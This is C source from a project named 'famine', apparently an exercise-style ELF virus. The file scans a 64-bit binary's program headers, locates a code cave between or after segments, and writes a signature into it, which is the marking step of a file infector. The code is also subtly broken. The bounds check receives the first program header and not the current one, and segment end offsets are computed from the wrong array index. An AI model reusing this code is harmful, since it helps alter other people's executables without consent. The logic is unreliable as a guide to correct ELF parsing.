#include "famine.h"

#include <elf.h> // Elf64_Phdr
#include <stdbool.h> // bool, false, true
#include <stdint.h> // uintN_t, UINT64_MAX
#include <string.h> // memcpy()
#include <stdio.h>

static bool check_segment_bounds(t_file *file, Elf64_Phdr *phdr)
{
	if (phdr->p_offset > file->size)
		return (false);
	if (phdr->p_filesz > file->size - phdr->p_offset)
		return (false);
	return (true);
}

// static bool is_valid_code_cave(t_file *file, uint64_t cave_start,
//                               uint64_t cave_end)
// {
// 	if (cave_end == UINT64_MAX)
// 		return (false);
// 	if (cave_end <= cave_start)
// 		return (false);
// 	if (cave_end - cave_start < SIGNATURE_SIZE)
// 		return (false);
// 	if (SIGNATURE_SIZE > file->size - cave_start)
// 		return (false);
// 	return (true);
// }

typedef struct s_range {
	uint64_t start;
	uint64_t end;
} t_range;

static uint16_t get_segments_ranges(t_file *file, t_elf64 *elf64, t_range *ranges)
{
	uint16_t count;

	count = 0;
	for (uint32_t i = 0; i < elf64->ehdr->e_phnum; i++) {
		if (!check_segment_bounds(file, elf64->phdr)
		    || elf64->phdr[i].p_filesz == 0)
			continue ;

		ranges[count].start = elf64->phdr[i].p_offset;
		ranges[count].end = ranges[i].start + elf64->phdr[i].p_filesz;
		count++;
	}
	return (count);
}

static void sort_ranges(t_range *ranges, uint16_t count)
{
	t_range tmp;

	for (uint16_t i = 0; i < count; i++) {
		for (uint16_t j = i + 1; j < count; j++) {
			if (ranges[j].start >= ranges[i].start)
				continue ;
			tmp = ranges[i];
			ranges[i] = ranges[j];
			ranges[j] = tmp;
		}
	}
}

static uint64_t find_code_cave(t_file *file, t_range *ranges, uint16_t count)
{
	uint64_t end;

	end = ranges[0].end;
	for (uint16_t i = 1; i < count; i++) {
		if (ranges[i].start > end) {
			if (ranges[i].start - end >= SIGNATURE_SIZE) {
				return (end);
			}
		}
		if (ranges[i].end > end)
			end = ranges[i].end;
	}
	if (file->size - end >= SIGNATURE_SIZE) {
		return (end);
	}
	return (0);
}

int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
{
	t_range ranges[elf64->ehdr->e_phnum];
	uint16_t count;
	uint64_t cave;

	count = get_segments_ranges(file, elf64, ranges);
	if (count == 0)
		return (1);

	sort_ranges(ranges, count);
	cave = find_code_cave(file, ranges, count);
	if (cave == 0)
		return (1);
	memcpy(file->map + cave, SIGNATURE, SIGNATURE_SIZE);
	return (0);
}
